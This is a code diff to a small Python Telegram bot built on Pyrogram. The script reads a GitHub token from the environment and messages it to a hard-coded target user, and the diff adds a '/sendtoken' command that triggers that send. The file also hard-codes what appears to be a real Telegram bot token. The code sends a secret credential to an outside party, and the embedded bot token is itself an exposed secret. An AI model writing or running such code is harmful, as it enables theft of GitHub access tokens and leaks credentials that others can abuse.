@@ -1,5 +1,6 @@
-from pyrogram import Client
+from pyrogram import Client, filters
 import os
+import sys
 
 # Replace 'YOUR_BOT_TOKEN', 'YOUR_API_ID', 'YOUR_API_HASH', and 'TARGET_USER_ID' with your actual values
 bot_token = '6126230406:AAFAtz4AhVLbSEnm7KabLzDa7d5Yf0_Mo2I'
@@ -12,7 +13,7 @@ app = Client("my_bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
 async def send_github_token():
     # Replace 'your_github_token' with your actual GitHub token
     github_token = os.getenv("GITHUB_TOKEN")
-
+    
     try:
         # Send the GitHub token to the specified user
         await app.send_message(target_user_id, f'GitHub Token: {github_token}')
@@ -23,6 +24,9 @@ async def send_github_token():
         # Stop the code after sending the message
         await app.stop()
 
+@app.on_message(filters.private & filters.command("sendtoken"))
+async def send_token_command(client, message):
+    await send_github_token()
+
 if __name__ == "__main__":
-    with app:
-        app.loop.run_until_complete(send_github_token())
+    app.run()
